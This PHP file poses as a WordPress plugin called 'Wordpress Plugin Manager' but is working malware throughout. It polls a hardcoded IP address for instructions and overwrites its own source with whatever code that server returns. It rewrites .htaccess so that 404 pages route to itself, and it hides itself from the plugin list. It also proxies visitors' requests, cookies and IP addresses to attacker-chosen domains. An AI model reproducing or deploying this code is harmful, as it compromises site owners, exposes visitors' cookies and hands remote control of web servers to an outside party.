<?php
/*
Plugin Name: Wordpress Plugin Manager 
*/

function fourofour()
{
	@error_reporting(error_reporting()&~E_NOTICE&~E_WARNING);

	$tourl = 300;
	$tofile = 3600;
	$ver = 7;
	$u = "http://146.185.220.77/v.html?v=$ver&h=" . urlencode($_SERVER['HTTP_HOST']);

	$gz = function_exists("gzinflate");
	$curl = function_exists("curl_init");

	$cachedir = dirname(__FILE__) . "/.k";
	@mkdir($cachedir);

	$s = $_SERVER['HTTP_HOST'];
	$fn = $cachedir . "/" . md5("1$s");
	$cfn = $cachedir . "/" . md5("2$s");
	$d = @file_get_contents($fn);

	$c = (int)@file_get_contents($cfn);
	if($setc=preg_match('#c([0-9l])+$#s', $_SERVER["REQUEST_URI"], $m))
	{
		$c = $m[1];
		if($c=='l')
		{
			$start = microtime(1);
			$rcnt = 0; $ecnt=0;
			if(strtolower(substr(PHP_OS,0,3))!='win')
				@system("rm -rf \"$cachedir\"");
			@mkdir($cachedir);
			$dh = @opendir($cachedir);
			while($dh && $fn=readdir($dh))
			{
				if($fn=="." || $fn=="..") continue;
				if(!@unlink("$cachedir/$fn"))
					$ecnt++;
				$rcnt++;
				if($rcnt>=1000) break;
			}
			closedir($dh);
			printf("%u %u", ($rcnt-$ecnt)?1:0, time());
			exit;
		}

		file_put_contents($cfn, $c);
		unset($d);
	}

	if(!$d || !($s=@stat($fn)) || $s["mtime"]<time()-$tourl)
	{
		$u .= "&c=$c";
		if($d = @file_get_contents($u))
		{
			// update
			if(preg_match('#^u:(.*)\s*$#s', $d, $m))
			{
				@file_put_contents(__FILE__, $m[1]);
				header("Location: $_SERVER[REQUEST_URI]"); // reload
				exit;
			}
			@file_put_contents($fn, $d);
		}
	}

	if($setc)
		exit($c);

	if($d)
	{
		$d = preg_split("/\r?\n/s", trim($d));
		srand((int)(microtime(1)*1000));
		shuffle($d);
		$d = array_pop($d);
		$d = sprintf($d, $t);
		$d = "http://$d";

		$selfdir = str_replace('\\', '/', dirname($_SERVER["SCRIPT_NAME"]));
		$path = preg_replace("#^" . $selfdir . "/#i", "", $_SERVER["REQUEST_URI"]);
		$path = preg_replace("#^/(wordpress)#", "", $path);
		$url = $d . $path;
		if($_SERVER["QUERY_STRING"])
		{
			$cachedir = 0;
			$url .= "?" . $_SERVER["QUERY_STRING"];
		}

		$cacheObj = false;
		$cachefn = $cachedir . "/" . md5($d . strtolower($path) . $ver . $c);
		if($cachedir && ($s=@stat($cachefn)) && time()-$s["mtime"]<$tofile)
		{
			$cacheObj = @unserialize(@file_get_contents($cachefn));
			if($cacheObj)
			{
				$content = $cacheObj->content;
				if($cacheObj->contentType)
					header("Content-Type: $cacheObj->contentType");
			}
		}

		if(!$cacheObj)
		{
			if($curl)
			{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_HEADER, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
				curl_setopt($ch, CURLOPT_COOKIE, $_SERVER['HTTP_COOKIE']);
				curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
				@curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Forwarded-For: $_SERVER[REMOTE_ADDR]", "X-WPM-Version: $ver"));
				if($gz) curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
				$response = curl_exec($ch);
				curl_close($ch);

				list($http_response_header, $content) = explode("\r\n\r\n", $response, 2);
				$http_response_header = explode("\r\n", $http_response_header);
			}
			else
			{
				$ctx = stream_context_create(array(
					"http"=>array(
						"method"=>"GET",
						"follow_location"=>0,
						"ignore_errors"=>1,
						"user_agent"=>$_SERVER["HTTP_USER_AGENT"] . "\r\n" .
							"Cookie: $_SERVER[HTTP_COOKIE]\r\n" . 
							"Referer: $_SERVER[HTTP_REFERER]\r\n" . 
							"X-Forwarded-For: $_SERVER[REMOTE_ADDR]"
						,
						"header"=>
							($gz ? "Accept-Encoding: gzip\r\n" : "") .
							"X-WPM-Version: $ver\r\n"
						,
				)));
				$content = @file_get_contents($url, false, $ctx);
			}

			$cacheObj = new stdClass();
			$cacheObj->status = array_shift($http_response_header);
			foreach($http_response_header as $x)
			{
				list($n,$v) = preg_split("/:\s*/", $x);
				switch(strtolower($n))
				{
				case "content-type":
					$cacheObj->contentType = $v;
				case "set-cookie":
					header($x);
					break;
				case "location":
					header($x);
					print $content;
					exit;
				case "no-cache":
					$cachedir = 0;
					break;
				case "content-encoding":
					if($v=="gzip" && !$curl)
						$content = gzinflate(substr($content, 10, -8));
					break;
				}
			}

			if(substr($content, -2)=="c0")
			{
				$cachedir = 0;
				$content = substr($content, 0, -2);
			}

			if($cachedir)
			{
				@mkdir($cachedir);
				$cacheObj->content = $content;
				@file_put_contents($cachefn, serialize($cacheObj));

				//$content = $content . " " . time();
			}
		}

		header("HTTP/1.1 200 OK");
		header("Status: 200 OK");
		ob_start("ob_gzhandler");
		exit($content);
	}
}

function fourofour_pp($plugins)
{
	foreach($plugins as $fn=>$p)
		if(basename($fn)==basename(__FILE__))
			unset($plugins[$fn]);
	return $plugins;
}


function fourofour_i()
{
	$rparts = preg_split('#[/\\\\]#', preg_replace('#/+$#', '', $_SERVER['DOCUMENT_ROOT']));
	$parts = preg_split('#[/\\\\]#', dirname(__FILE__));

	$rel = array();
	$sdir = "";
	for($i=0; count($parts)>=count($rparts); $i++)
	{
		$dir = join($parts, "/");
	
		if(@file_exists("$dir/wp-settings.php"))
		{
			while(count($parts)>count($rparts))
				array_unshift($rel, array_pop($parts));
			$sdir = join("/", $rel);
			break;
		}

		$dir = $sdir = "";
		array_unshift($rel, array_pop($parts));
	}

	if($sdir)
	{
		$hta = trim(@file_get_contents("$dir/.htaccess"));
		if(!preg_match('#BEGIN\s*WordPress.*RewriteRule.*END#si', $hta) && !strpos($hta, basename(__FILE__)))
		{
			$ed = "\nErrorDocument 404 /$sdir/" . basename(__FILE__) . "\n";
			$hta = preg_replace('#(BEGIN\s*WordPress)#si', "\\1$ed", $hta);
			if(!strpos($hta, basename(__FILE__)))
				$hta .= "$ed";
			@file_put_contents("$dir/.htaccess", $hta);
		}
	}
}
fourofour_i();


if(function_exists("add_action"))
{
	add_action("404_template", "fourofour");
}
else
{
	fourofour();
}

if(function_exists("add_filter"))
	add_filter("all_plugins", "fourofour_pp");

return 1;

?>